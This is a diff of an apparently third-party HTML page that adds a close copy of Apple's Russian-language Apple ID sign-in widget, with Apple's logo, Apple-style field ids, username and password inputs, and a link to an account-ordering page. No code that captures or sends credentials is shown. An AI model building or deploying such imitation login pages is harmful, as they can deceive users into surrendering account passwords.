@@ -28,14 +28,127 @@
     <apple-auth app-loading-defaults="{appLoadingDefaults}" pmrpc-hook="{pmrpcHook}">
         <sign-in suppress-iforgot="{suppressIforgot}" {on-test-idp}="@_onTestIdp">
             <section class="bb">
-                <label for="email"></label>
-                <input type="text" id="email" can-field="accountName" ($focus)="appleIdFocusHandler()" ($keyup)="appleIdKeyupHandler()" ($blur)="appleIdBlurHandler()" name="email" placeholder="Например: victor123" autocomplete="off" spellcheck="false" autocorrect="off" autocapitalize="off" maxlength="32">
+                <label for="account_name_text_field"></label>
+                <input type="text" id="account_name_text_field" can-field="accountName" ($focus)="appleIdFocusHandler()" ($keyup)="appleIdKeyupHandler()" ($blur)="appleIdBlurHandler()" name="email" placeholder="Например: victor123" autocomplete="off" spellcheck="false" autocorrect="off" autocapitalize="off" maxlength="32">
         
-                <label for="password"></label>
-                <input type="password" id="password" ($focus)="pwdFocusHandler()" ($keyup)="passwordKeyUpHandler()" ($blur)="pwdBlurHandler()" name="password" placeholder="Пароль" autocomplete="off" autocorrect="off" autocapitalize="off" minlength="8" maxlength="15" pattern="[0-9A-Za-z]{8,15}">
+                <label for="password_text_field"></label>
+                <input type="password" id="password_text_field" ($focus)="pwdFocusHandler()" ($keyup)="passwordKeyUpHandler()" ($blur)="pwdBlurHandler()" name="password" placeholder="Пароль" autocomplete="off" autocorrect="off" autocapitalize="off" minlength="8" maxlength="15" pattern="[0-9A-Za-z]{8,15}">
             </section>
         </sign-in>
     </apple-auth>
+
+    <apple-auth app-loading-defaults="{appLoadingDefaults}" pmrpc-hook="{pmrpcHook}">
+        <div class="widget-container  fade-in restrict-min-content  restrict-max-wh  fade-in " data-mode="embed" data-isiebutnotedge="false">
+        
+            <div id="step" class="si-step  ">
+                    <logo {hide-app-logo}="hideAppLogo" {show-fade-in}="showFadeIn">
+            
+                <div class="logo   signin-label  fade-in ">
+                    
+                        <img class="cnsmr-app-image " src="https://appleid.cdn-apple.com/static/bin/cb3430768946/dist/assets/images/appleid_i18n/aid_logo@2x.png" srcset="" alt="Apple ID" style="width: 200px;">
+                </div>
+        
+        
+        </logo>
+                <div id="stepEl" class="   "><sign-in suppress-iforgot="{suppressIforgot}" initial-route="" {on-test-idp}="@_onTestIdp">
+            
+                
+                  <div class="signin fade-in" id="signin">
+                      <app-title signin-label="true" title-class="">    
+            
+            
+                <h1 tabindex="-1" class="si-container-title tk-intro  ">
+                                    Управление учетной записью Apple	
+                      
+                </h1>
+        </app-title>     
+                    
+        
+        
+                    <div class="container si-field-container  password-second-step     ">
+                        <div id="sign_in_form" class="signin-form
+          
+          
+           
+           
+           
+           fed-auth 
+            
+            
+            
+             hide-password  
+          ">
+          <div class="si-field-container container">
+            <div class="form-table">
+              <div class="account-name form-row    ">
+                <label class="sr-only form-cell form-label" for="account_name_text_field">Управление учетной записью Apple Apple ID</label>
+                <div class="form-cell">
+        
+                  <div class=" form-cell-wrapper ">
+                    <input type="text" id="account_name_text_field" can-field="accountName" autocomplete="off" autocorrect="off" autocapitalize="off" aria-required="true" required="required" aria-invalid="false" spellcheck="false" ($focus)="appleIdFocusHandler()" ($keyup)="appleIdKeyupHandler()" ($blur)="appleIdBlurHandler()" class="force-ltr form-textbox form-textbox-text " placeholder="Apple ID" autofocus="">
+                    <span aria-hidden="true" id="apple_id_field_label" class=" form-label-flyout">             
+                      Apple ID
+                    </span>
+                  </div>
+                </div>
+              </div>
+              <div class="password form-row     " aria-hidden="true">
+                <label class="sr-only form-cell form-label" for="password_text_field">Пароль</label>
+                <div class="form-cell">
+                  <div class="form-cell-wrapper ">
+                    <input type="password" id="password_text_field" ($keyup)="passwordKeyUpHandler()" ($focus)="pwdFocusHandler()" ($blur)="pwdBlurHandler()" aria-required="true" required="required" can-field="password" autocomplete="off" class="form-textbox form-textbox-text " placeholder="Пароль" aria-invalid="false" tabindex="-1">
+                    <span id="password_field_label" aria-hidden="true" class=" form-label-flyout">              Пароль 
+                    </span>
+                    <span class="sr-only form-label-flyout" id="invalid_user_name_pwd_err_msg" aria-hidden="true">
+                      
+                    </span>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>              
+        
+                      
+                        <div class="si-remember-password">
+                          <input type="checkbox" id="remember-me" class="form-choice form-choice-checkbox" {($checked)}="isRememberMeChecked">
+                          <label id="remember-me-label" class="form-label" for="remember-me">
+                            <span class="form-choice-indicator"></span>                    Запомнить меня
+                          </label>
+                        </div>
+                      <div class="spinner-container auth  hide "></div>
+                      <button id="sign-in" ($click)="_verify($element)" tabindex="0" class="si-button btn  fed-ui   fed-ui-animation-show   disable   remember-me  " aria-label="
+                           Продолжить
+                      " aria-disabled="true" disabled="">
+                        <i class="icon icon_sign_in"></i>
+                        <span class="text feat-split">
+                            
+                              Продолжить
+                          
+                        </span>
+                        </button>
+                        <button id="sign-in-cancel" ($click)="_signInCancel($element)" aria-disabled="false" tabindex="0" class="si-button btn secondary feat-split  remember-me  " aria-label="Закрыть">
+                          <span class="text">                     Закрыть
+                            
+                          </span>
+                        </button>
+                    </div>
+                    <div class="si-container-footer">
+                      
+                      
+                    </div>
+                  </div>
+                  
+                  
+            
+        
+        </sign-in></div>
+            </div>
+            <div id="stocking" style="display:none !important;"></div>
+        </div>
+        <idms-modal wrap-class="full-page-error-wrapper " {(show)}="showfullPageError" auto-close="false"> 
+        </idms-modal>
+        </apple-auth>
 
     <section class="kk">
         <a href="order-add-account.html">Создать учётную запись</a>
